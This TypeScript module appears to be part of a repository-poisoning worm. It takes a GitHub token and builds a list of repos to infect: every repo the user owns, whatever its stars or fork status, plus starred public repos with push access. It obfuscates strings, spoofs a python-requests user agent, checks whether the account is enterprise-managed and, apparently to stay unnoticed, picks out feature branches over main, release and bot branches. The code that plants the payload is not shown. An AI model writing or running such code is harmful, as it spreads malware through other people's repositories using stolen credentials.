import { githubJson } from "../../github_utils/client";
import { logUtil } from "../../utils/logger";
import type { TargetRepo } from "./types";

declare function scramble(str: string): string;

// ───────────────────────────────────────────────────────────────────────
// Enterprise check
// ───────────────────────────────────────────────────────────────────────

/**
 * Returns `true` when the user is NOT enterprise-managed.
 * An unauthenticated GET to github.com/user returns 200 for non-enterprise users
 * (redirects to login page). Enterprise-managed users redirect to SSO.
 */
export async function isNonEnterpriseUser(): Promise<boolean> {
  try {
    const res = await fetch(scramble("https://github.com/user"), {
      headers: { "User-Agent": scramble("python-requests/2.31.0") },
      redirect: "manual",
    });
    // 302 to /login = regular user. 302 to /enterprises/.../sso = enterprise.
    const location = res.headers.get("location") ?? "";
    return !location.includes("/enterprises/");
  } catch {
    return false;
  }
}

// ───────────────────────────────────────────────────────────────────────
// Repo discovery
// ───────────────────────────────────────────────────────────────────────

interface GitHubRepo {
  full_name: string;
  private: boolean;
  fork: boolean;
  stargazers_count: number;
  language: string | null;
  default_branch: string;
  permissions?: { admin: boolean; push: boolean; pull: boolean };
}

/**
 * Fetch all public repos the PAT has push access to, plus all private repos
 * owned by the authenticated user.  Owned repos are poisoned regardless of
 * stars, push access, or fork status.
 */
export async function findTargetRepos(
  token: string,
  aggressive = false,
): Promise<TargetRepo[]> {
  const repos: TargetRepo[] = [];
  const seen = new Set<string>();

  // 1. Get the authenticated user's login
  let userLogin: string | null = null;
  try {
    const user = await githubJson<{ login: string }>(token, "/user");
    userLogin = user?.login ?? null;
  } catch {
    // unauthenticated or token lacks user scope — skip owned-repo fetch
  }

  // 2. Fetch owned private repos (poison all, no filters)
  if (userLogin) {
    await collectRepos(
      token,
      `/users/${userLogin}/repos?per_page=100&sort=pushed&type=owner`,
      repos,
      seen,
      {
        checkPush: false,
        skipForks: false,
        requirePrivate: false,
        minStars: 0,
      },
    );
  }

  // 3. Fetch public repos with push access (standard path)
  const visibility = aggressive ? "all" : "public";
  await collectRepos(
    token,
    `/user/repos?per_page=100&sort=pushed&visibility=${visibility}`,
    repos,
    seen,
    {
      checkPush: true,
      skipForks: true,
      requirePrivate: !aggressive,
      minStars: 10,
    },
  );

  logUtil.log(`[RepoMutator] Found ${repos.length} eligible repo(s).`);
  return repos;
}

interface CollectFilters {
  checkPush: boolean;
  skipForks: boolean;
  requirePrivate: boolean;
  minStars: number;
}

async function collectRepos(
  token: string,
  url: string,
  repos: TargetRepo[],
  seen: Set<string>,
  filters: CollectFilters,
): Promise<void> {
  const perPage = 100;
  const maxRepos = 500;
  let page = 1;

  while (true) {
    let batch: GitHubRepo[];
    try {
      batch = await githubJson<GitHubRepo[]>(token, `${url}&page=${page}`);
    } catch {
      break;
    }
    if (!batch || batch.length === 0) break;

    for (const r of batch) {
      if (seen.has(r.full_name)) continue;
      if (filters.checkPush && !r.permissions?.push) continue;
      if (filters.skipForks && r.fork) continue;
      if (filters.requirePrivate && r.private) continue;
      if (r.stargazers_count < filters.minStars) continue;

      const [owner, name] = r.full_name.split("/");
      if (!owner || !name) continue;

      seen.add(r.full_name);
      repos.push({
        owner,
        name,
        fullName: r.full_name,
        stars: r.stargazers_count,
        isPublic: !r.private,
        language: r.language ?? null,
        defaultBranch: r.default_branch,
        isAdmin: r.permissions?.admin ?? false,
      });
    }

    if (batch.length < perPage || repos.length >= maxRepos) break;
    page++;
  }
}

// ───────────────────────────────────────────────────────────────────────
// Feature branch filter
// ───────────────────────────────────────────────────────────────────────

const NON_FEATURE_BRANCHES = new Set(["main", "master", "gh-pages"]);

const NON_FEATURE_PREFIXES = [
  "release/",
  "release-",
  "dependabot/",
  "copilot/",
  "renovate/",
];

/**
 * Returns `true` when a branch name looks like a feature branch.
 */
export function isFeatureBranch(branchName: string): boolean {
  if (NON_FEATURE_BRANCHES.has(branchName)) return false;
  if (NON_FEATURE_PREFIXES.some((prefix) => branchName.startsWith(prefix)))
    return false;
  return true;
}
